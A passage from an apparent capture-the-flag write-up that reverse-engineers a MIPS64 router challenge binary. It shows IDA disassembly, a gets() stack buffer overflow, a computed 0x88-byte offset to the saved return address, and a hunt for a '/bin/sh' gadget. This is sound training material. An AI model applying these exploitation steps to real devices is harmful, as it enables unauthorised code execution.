[QEMU target detected - vmmap result might not be accurate; see `help vmmap`]
pwndbg&gt; continue
Continuing.
warning: Could not load shared library symbols for 2 libraries, e.g. /lib/libc.so.6.
Use the &quot;info sharedlibrary&quot; command to see the complete listing.
Do you need &quot;set solib-search-path&quot; or &quot;set sysroot&quot;?
[Inferior 1 (process 1) exited normally]
</code></pre><p>The process exited because we didn&rsquo;t inserted any breakpoints and so our python script outs this:</p>
<pre tabindex="0"><code>+---------------------------------+
|/                               \|
|        ITSY MIPSY ROUTER        |
|\                               /|
+---------------------------------+

Menu:
  0. Quit.
  1. Show network interfaces
  2. Ping internal HTTP file server
  3. Log in as admin

[guest@mipsy] 
</code></pre><p>We&rsquo;re able to debug properly our process !</p>
<div class="gblog-post__anchorwrap">
    <h2 id="reverse-engineering">
        Reverse Engineering
        <a data-clipboard-text="https://nasm.re/posts/mipsy/#reverse-engineering" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Reverse Engineering" href="#reverse-engineering">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>We can take a look at the binary by running the file command:</p>
<pre tabindex="0"><code>$ file mipsy                                                                  
mipsy: ELF 64-bit MSB executable, MIPS, MIPS64 rel2 version 1 (SYSV), dynamically linked, interpreter /lib64/ld.so.1, BuildID[sha1]=e20cf7872e96482095ce68e6d4d03806d5928de4, for GNU/Linux 3.2.0, not stripped
</code></pre><p>So it&rsquo;s a mips64 big endian binary dynamically linked. As we see above, the program is asking for an input among 4 options: Quit, Show network interfaces, Ping internal HTTP file server and Login as admin. We can test these options remotely:</p>
<pre tabindex="0"><code>+---------------------------------+
|/                               \|
|        ITSY MIPSY ROUTER        |
|\                               /|
+---------------------------------+

Menu:
  0. Quit.
  1. Show network interfaces
  2. Ping internal HTTP file server
  3. Log in as admin

[guest@mipsy] $ 1
The router has the following network interfaces:
* lo
* eth0
* eth2
* eth1

Menu:
  0. Quit.
  1. Show network interfaces
  2. Ping internal HTTP file server
  3. Log in as admin

[guest@mipsy] $ 2
Success: HTTP file server is up!

Menu:
  0. Quit.
  1. Show network interfaces
  2. Ping internal HTTP file server
  3. Log in as admin

[guest@mipsy] $ 3
Input your password:
&gt;&gt;&gt; l3eT_p4sS
Error: wrong password.

Menu:
  0. Quit.
  1. Show network interfaces
  2. Ping internal HTTP file server
  3. Log in as admin

[guest@mipsy] $ 0
</code></pre><p>It doesn&rsquo;t give any interesting informations so instead of fuzzing manually the binary to find the vulnerability, I reversed the main functions in IDA. And particulary the code of the the function corresponding to the &ldquo;Login as admin&rdquo; feature. The assembly code of this function looks like such:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="na">.globl</span> <span class="no">authenticate</span>
<span class="nl">authenticate:</span>

<span class="nf">var_40</span><span class="err">=</span> <span class="p">-</span><span class="mi">0x40</span>
<span class="nf">var_18</span><span class="err">=</span> <span class="p">-</span><span class="mi">0x18</span>
<span class="nf">var_10</span><span class="err">=</span> <span class="p">-</span><span class="mi">0x10</span>
<span class="nf">ret_addr</span><span class="err">=</span> <span class="p">-</span><span class="mi">8</span>

<span class="nf">daddiu</span>  <span class="no">$sp</span><span class="p">,</span> <span class="p">-</span><span class="mi">0x90</span>       <span class="c">; Doubleword Add Immediate Unsigned
</span><span class="c"></span><span class="no">sd</span>      <span class="no">$ra</span><span class="p">,</span> <span class="mi">0x90</span><span class="err">+</span><span class="no">ret_addr</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c">; Store Doubleword
</span><span class="c"></span><span class="no">sd</span>      <span class="no">$fp</span><span class="p">,</span> <span class="mi">0x90</span><span class="err">+</span><span class="no">var_10</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c">; Store Doubleword
</span><span class="c"></span><span class="no">sd</span>      <span class="no">$gp</span><span class="p">,</span> <span class="mi">0x90</span><span class="err">+</span><span class="no">var_18</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c">; Store Doubleword
</span><span class="c"></span><span class="no">move</span>    <span class="no">$fp</span><span class="p">,</span> <span class="no">$sp</span>
<span class="nf">lui</span>     <span class="no">$gp</span><span class="p">,</span> <span class="mi">4</span>           <span class="c">; Load Upper Immediate
</span><span class="c"></span><span class="no">daddu</span>   <span class="no">$gp</span><span class="p">,</span> <span class="no">$t9</span>         <span class="c">; Doubleword Add Unsigned
</span><span class="c"></span><span class="no">daddiu</span>  <span class="no">$gp</span><span class="p">,</span> <span class="mi">0x3AA4</span>      <span class="c">; Doubleword Add Immediate Unsigned
</span><span class="c"></span><span class="no">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x120020000</span>  <span class="c">; Doubleword Load Immediate
</span><span class="c"></span><span class="no">daddiu</span>  <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span><span class="p">,</span> <span class="p">(</span><span class="no">aInputYourPassw</span> <span class="p">-</span> <span class="mi">0x120020000</span><span class="p">)</span>  <span class="c">; &#34;Input your password:&#34;
</span><span class="c"></span><span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">puts</span>        <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
<span class="nf">jalr</span>    <span class="no">$t9</span> <span class="c">; puts       ; Jump And Link Register
</span><span class="c"></span><span class="no">nop</span>
<span class="nf">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x120020000</span>  <span class="c">; Doubleword Load Immediate
</span><span class="c"></span><span class="no">daddiu</span>  <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span><span class="p">,</span> <span class="p">(</span><span class="no">asc_120025B00</span> <span class="p">-</span> <span class="mi">0x120020000</span><span class="p">)</span>  <span class="c">; &#34;&gt;&gt;&gt; &#34;
</span><span class="c"></span><span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">printf</span>      <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
<span class="nf">jalr</span>    <span class="no">$t9</span> <span class="c">; printf     ; Jump And Link Register
</span><span class="c"></span><span class="no">nop</span>
<span class="nf">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">stdout</span>      <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">ld</span>      <span class="no">$v0</span><span class="p">,</span> <span class="p">(</span><span class="no">stdout</span> <span class="p">-</span> <span class="mi">0x120042BC8</span><span class="p">)(</span><span class="no">$v0</span><span class="p">)</span>  <span class="c">; Load Doubleword
</span><span class="c"></span><span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; stream
</span><span class="c"></span><span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">fflush</span>      <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
<span class="nf">jalr</span>    <span class="no">$t9</span> <span class="c">; fflush     ; Jump And Link Register
</span><span class="c"></span><span class="no">nop</span>
<span class="nf">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$fp</span>
<span class="nf">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">gets</span>        <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
<span class="nf">jalr</span>    <span class="no">$t9</span> <span class="c">; gets       ; Jump And Link Register
</span><span class="c"></span><span class="no">nop</span>
<span class="nf">daddiu</span>  <span class="no">$v0</span><span class="p">,</span> <span class="no">$fp</span><span class="p">,</span> <span class="mi">0x50</span>   <span class="c">; Doubleword Add Immediate Unsigned
</span><span class="c"></span><span class="no">li</span>      <span class="no">$a2</span><span class="p">,</span> <span class="mi">0x20</span>  <span class="c">; &#39; &#39;  ; n
</span><span class="c"></span><span class="no">move</span>    <span class="no">$a1</span><span class="p">,</span> <span class="no">$zero</span>       <span class="c">; c
</span><span class="c"></span><span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; s
</span><span class="c"></span><span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">memset</span>      <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
<span class="nf">jalr</span>    <span class="no">$t9</span> <span class="c">; memset     ; Jump And Link Register
</span><span class="c"></span><span class="no">nop</span>
<span class="nf">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$fp</span>         <span class="c">; s
</span><span class="c"></span><span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">strlen</span>      <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
<span class="nf">jalr</span>    <span class="no">$t9</span> <span class="c">; strlen     ; Jump And Link Register
</span><span class="c"></span><span class="no">nop</span>
<span class="nf">daddiu</span>  <span class="no">$v1</span><span class="p">,</span> <span class="no">$fp</span><span class="p">,</span> <span class="mi">0x50</span>   <span class="c">; Doubleword Add Immediate Unsigned
</span><span class="c"></span><span class="no">move</span>    <span class="no">$a2</span><span class="p">,</span> <span class="no">$v1</span>
<span class="nf">move</span>    <span class="no">$a1</span><span class="p">,</span> <span class="no">$v0</span>
<span class="nf">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$fp</span>
<span class="nf">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">kdf</span>         <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
<span class="nf">bal</span>     <span class="no">kdf</span>              <span class="c">; Branch Always and Link
</span><span class="c"></span><span class="no">nop</span>
<span class="nf">daddiu</span>  <span class="no">$v1</span><span class="p">,</span> <span class="no">$fp</span><span class="p">,</span> <span class="mi">0x50</span>   <span class="c">; Doubleword Add Immediate Unsigned
</span><span class="c"></span><span class="no">li</span>      <span class="no">$a2</span><span class="p">,</span> <span class="mi">0x20</span>  <span class="c">; &#39; &#39;  ; n
</span><span class="c"></span><span class="no">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x120020000</span>  <span class="c">; Doubleword Load Immediate
</span><span class="c"></span><span class="no">daddiu</span>  <span class="no">$a1</span><span class="p">,</span> <span class="no">$v0</span><span class="p">,</span> <span class="p">(</span><span class="no">unk_120025B08</span> <span class="p">-</span> <span class="mi">0x120020000</span><span class="p">)</span>  <span class="c">; s2
</span><span class="c"></span><span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v1</span>         <span class="c">; s1
</span><span class="c"></span><span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">memcmp</span>      <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>
<span class="nf">jalr</span>    <span class="no">$t9</span> <span class="c">; memcmp     ; Jump And Link Register
</span><span class="c"></span><span class="no">nop</span>
<span class="nf">bnez</span>    <span class="no">$v0</span><span class="p">,</span> <span class="no">loc_120004688</span>  <span class="c">; Branch on Not Zero
</span></code></pre></div><p>When I began this challenge I didn&rsquo;t know anything about mips64 assembly but thanks to auto comments in IDA and to <a
  class="gblog-markdown__link"
  href="http://math-atlas.sourceforge.net/devel/assembly/mips-iv.pdf"
  
  >this</a
> and <a
  class="gblog-markdown__link"
  href="https://write.lain.faith/~/Haskal/mips-rop/"
  
  >this</a
>, I understood very quickly the main components of the architecture. And that&rsquo;s why I noticed a call to the <code>gets</code> function which as it&rsquo;s known read an arbitrary number of bytes from stdin to the buffer indicated in argument, and so in our case in <code>$fp</code>, which is initialized to <code>$sp-0x90</code>. Next the call to <code>gets</code>, <code>printf</code> and <code>fflush</code>, it calls <code>memset</code> to set every bytes of another buffer allocated next to our input to zero. Then it computes the length of our input and calls the <code>kdf</code> function with the following arguments: <code>kdf(char *input_password, int input_length, unsigned char *out)</code>. The kdf function is basically doing some encryption operations according to our input and its length and stores the result in the third argument.
And the result of this encryption routine is compared to a constant value with <code>memcmp</code>.</p>
<p>So we discovered the stack based buffer overflow which allows us to overwrite the saved instruction pointer saved at the functions&rsquo;s prologue.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="exploitation">
        Exploitation
        <a data-clipboard-text="https://nasm.re/posts/mipsy/#exploitation" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Exploitation" href="#exploitation">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Since we understood the vulnerable function, we can represent the stackframe like that:</p>
<pre tabindex="0"><code>$saved_fp-0x90+----------------------+
              |                      |
              |                      |
              |   buffer_password    |
              |                      |
              |                      |
$saved_fp-0x40+----------------------+
              |                      |
              |                      |
              |         out          |
              |                      |
$saved_fp-0x16+----------------------+
              |       saved_gp       |
$saved_fp-0x10+----------------------+
              |       saved_fp       |
   $saved_fp-8+----------------------+
              |       saved_ra       |
     $saved_fp+----------------------+
              |                      |
              |  calling function's  |
              |      stackframe      |
              |                      |
              |                      |
              +----------------------+
</code></pre><p>And so, according to this schema, we overwrite the saved <code>$ra</code> from a padding of <code>0x90-0x8=0x88</code> bytes.
But since we&rsquo;re able to jmp everywhere, we have to figure out what kind of technique we want to use.</p>
<div class="gblog-post__anchorwrap">
    <h4 id="one-gadget-">
        One gadget ?
        <a data-clipboard-text="https://nasm.re/posts/mipsy/#one-gadget-" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor One gadget ?" href="#one-gadget-">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h4>
</div>
<p>For an obsure reason, I thought the <code>gets</code> function had for badchar the NULL byte, so I was looking for a one gadget in the binary.
I discovered during the reverse engineering part an interesting snippet of code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span>                 <span class="no">.globl</span> <span class="no">ip</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">ip</span><span class="p">:</span>                                      <span class="c">; CODE XREF: main+260↓p
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FC0</span>                                          <span class="c">; DATA XREF: LOAD:0000000120002438↑o ...
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FC0</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">ret</span>             <span class="err">=</span> <span class="p">-</span><span class="mi">0x1050</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">n_read</span>          <span class="err">=</span> <span class="p">-</span><span class="mi">0x104C</span> 
<span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FC0</span> <span class="no">fd</span>              <span class="err">=</span> <span class="p">-</span><span class="mi">0x1048</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">var_1044</span>        <span class="err">=</span> <span class="p">-</span><span class="mi">0x1044</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">buf</span>             <span class="err">=</span> <span class="p">-</span><span class="mi">0x1040</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">ptr_binsh</span>       <span class="err">=</span> <span class="p">-</span><span class="mi">0x40</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">dash_c</span>          <span class="err">=</span> <span class="p">-</span><span class="mi">0x38</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">var_30</span>          <span class="err">=</span> <span class="p">-</span><span class="mi">0x30</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">null</span>            <span class="err">=</span> <span class="p">-</span><span class="mi">0x28</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">var_18</span>          <span class="err">=</span> <span class="p">-</span><span class="mi">0x18</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">var_10</span>          <span class="err">=</span> <span class="p">-</span><span class="mi">0x10</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span> <span class="no">var_8</span>           <span class="err">=</span> <span class="p">-</span><span class="mi">8</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span>
<span class="nl">.text:</span><span class="err">0000000120003</span><span class="nf">FC0</span>                 <span class="no">daddiu</span>  <span class="no">$sp</span><span class="p">,</span> <span class="p">-</span><span class="mi">0x1050</span>     <span class="c">; Doubleword Add Immediate Unsigned
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FC4</span>                 <span class="no">sd</span>      <span class="no">$ra</span><span class="p">,</span> <span class="mi">0x1050</span><span class="err">+</span><span class="no">var_8</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c">; Store Doubleword
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FC8</span>                 <span class="no">sd</span>      <span class="no">$fp</span><span class="p">,</span> <span class="mi">0x1050</span><span class="err">+</span><span class="no">var_10</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c">; Store Doubleword
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FCC</span>                 <span class="no">sd</span>      <span class="no">$gp</span><span class="p">,</span> <span class="mi">0x1050</span><span class="err">+</span><span class="no">var_18</span><span class="p">(</span><span class="no">$sp</span><span class="p">)</span>  <span class="c">; Store Doubleword
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FD0</span>                 <span class="no">move</span>    <span class="no">$fp</span><span class="p">,</span> <span class="no">$sp</span>         <span class="c">; prologue
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FD4</span>                 <span class="no">lui</span>     <span class="no">$gp</span><span class="p">,</span> <span class="mi">4</span>           <span class="c">; Load Upper Immediate
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FD8</span>                 <span class="no">daddu</span>   <span class="no">$gp</span><span class="p">,</span> <span class="no">$t9</span>         <span class="c">; Doubleword Add Unsigned
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FDC</span>                 <span class="no">daddiu</span>  <span class="no">$gp</span><span class="p">,</span> <span class="mi">0x4060</span>      <span class="c">; Doubleword Add Immediate Unsigned
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FE0</span>                 <span class="no">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x120020000</span>  <span class="c">; Doubleword Load Immediate
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FE4</span>                 <span class="no">daddiu</span>  <span class="no">$v0</span><span class="p">,</span> <span class="p">(</span><span class="no">aBinSh</span> <span class="p">-</span> <span class="mi">0x120020000</span><span class="p">)</span>  <span class="c">; &#34;/bin/sh&#34;
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FE8</span>                 <span class="no">sd</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x1010</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>  <span class="c">; Store Doubleword
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FEC</span>                 <span class="no">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x120020000</span>  <span class="c">; Doubleword Load Immediate
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FF0</span>                 <span class="no">daddiu</span>  <span class="no">$v0</span><span class="p">,</span> <span class="p">(</span><span class="no">aC</span> <span class="p">-</span> <span class="mi">0x120020000</span><span class="p">)</span>  <span class="c">; &#34;-c&#34;
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FF4</span>                 <span class="no">sd</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x1018</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>  <span class="c">; Store Doubleword
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FF8</span>                 <span class="no">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x120020000</span>  <span class="c">; Doubleword Load Immediate
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120003</span><span class="no">FFC</span>                 <span class="no">daddiu</span>  <span class="no">$v0</span><span class="p">,</span> <span class="p">(</span><span class="no">aListInterfaces</span> <span class="p">-</span> <span class="mi">0x120020000</span><span class="p">)</span>  <span class="c">; &#34;./list_interfaces.sh&#34;
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004000</span>                 <span class="no">sd</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0x1020</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>  <span class="c">; Store Doubleword
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004004</span>                 <span class="no">sd</span>      <span class="no">$zero</span><span class="p">,</span> <span class="mi">0x1028</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>  <span class="c">; Store Doubleword
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004008</span>                 <span class="no">daddiu</span>  <span class="no">$v0</span><span class="p">,</span> <span class="no">$fp</span><span class="p">,</span> <span class="mi">8</span>      <span class="c">; Doubleword Add Immediate Unsigned
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000400</span><span class="no">C</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; pipedes
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004010</span>                 <span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">pipe</span>        <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004014</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; pipe
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004018</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; pipe       ; Jump And Link Register
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000401</span><span class="no">C</span>                 <span class="no">nop</span>                      <span class="c">; nop
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004020</span>                 <span class="no">move</span>    <span class="no">$v1</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; return value
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004024</span>                 <span class="no">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="mi">0xFFFFFFFFFFFFFFFF</span>  <span class="c">; Doubleword Load Immediate
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004028</span>                 <span class="no">bne</span>     <span class="no">$v1</span><span class="p">,</span> <span class="no">$v0</span><span class="p">,</span> <span class="no">loc_120004070</span>  <span class="c">; Branch on Not Equal
</span><span class="c">; skip
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004070</span> <span class="no">loc_120004070</span><span class="p">:</span>                           <span class="c">; CODE XREF: ip+68↑j
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004070</span>                 <span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">fork</span>        <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004074</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; fork
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004078</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; fork       ; Jump And Link Register
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000407</span><span class="no">C</span>                 <span class="no">nop</span>                      <span class="c">; nop
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004080</span>                 <span class="no">sw</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>      <span class="c">; Store Word
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004084</span>                 <span class="no">lw</span>      <span class="no">$v1</span><span class="p">,</span> <span class="mi">0</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>      <span class="c">; Load Word
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004088</span>                 <span class="no">dli</span>     <span class="no">$v0</span><span class="p">,</span> <span class="p">-</span><span class="mi">1</span>          <span class="c">; Doubleword Load Immediate
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000408</span><span class="no">C</span>                 <span class="no">bne</span>     <span class="no">$v1</span><span class="p">,</span> <span class="no">$v0</span><span class="p">,</span> <span class="no">loc_1200040D4</span>  <span class="c">; Branch on Not Equal
</span><span class="c">; skip
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">D4</span> <span class="no">loc_1200040D4</span><span class="p">:</span>                           <span class="c">; CODE XREF: ip+CC↑j
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">D4</span>                 <span class="no">lw</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>      <span class="c">; Load Word
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">D8</span>                 <span class="no">bnez</span>    <span class="no">$v0</span><span class="p">,</span> <span class="no">loc_120004158</span>  <span class="c">; Branch on Not Zero
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">DC</span>                 <span class="no">nop</span>                      <span class="c">; nop
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">E0</span>                 <span class="no">lw</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">0xC</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>    <span class="c">; Load Word
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">E4</span>                 <span class="no">li</span>      <span class="no">$a1</span><span class="p">,</span> <span class="mi">1</span>           <span class="c">; fd2
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">E8</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; fd
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">EC</span>                 <span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">dup2</span>        <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">F0</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; dup2
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">F4</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; dup2       ; Jump And Link Register
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">F8</span>                 <span class="no">nop</span>                      <span class="c">; nop
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200040</span><span class="no">FC</span>                 <span class="no">lw</span>      <span class="no">$v0</span><span class="p">,</span> <span class="mi">8</span><span class="p">(</span><span class="no">$fp</span><span class="p">)</span>      <span class="c">; Load Word
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004100</span>                 <span class="no">move</span>    <span class="no">$a0</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; fd
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004104</span>                 <span class="no">dla</span>     <span class="no">$v0</span><span class="p">,</span> <span class="no">close</span>       <span class="c">; Load 64-bit address
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004108</span>                 <span class="no">move</span>    <span class="no">$t9</span><span class="p">,</span> <span class="no">$v0</span>         <span class="c">; close
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">000000012000410</span><span class="no">C</span>                 <span class="no">jalr</span>    <span class="no">$t9</span> <span class="c">; close      ; Jump And Link Register
</span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">0000000120004110</span>                 <span class="no">nop</span>                      <span class="c">; nop
